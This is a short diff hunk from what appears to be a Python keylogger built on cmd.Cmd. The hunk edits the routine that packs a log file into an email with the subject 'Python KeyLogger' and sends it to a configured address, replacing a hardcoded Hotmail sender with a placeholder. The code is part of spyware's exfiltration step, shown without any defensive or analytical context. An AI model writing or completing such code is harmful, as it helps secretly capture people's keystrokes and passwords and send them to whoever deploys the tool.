@@ -116,7 +116,7 @@ class MyPrompt(cmd.Cmd):
         sourcepath = os.path.dirname(os.path.abspath(filename)) + "\\" + filename
 
         msg = MIMEMultipart()
-        msg['From'] = 'mypylog@hotmail.com'
+        msg['From'] = 'your email adress'
         print(self.client["mail"])
         msg['To'] = self.client["mail"]
         msg['Subject'] = 'Python KeyLogger'
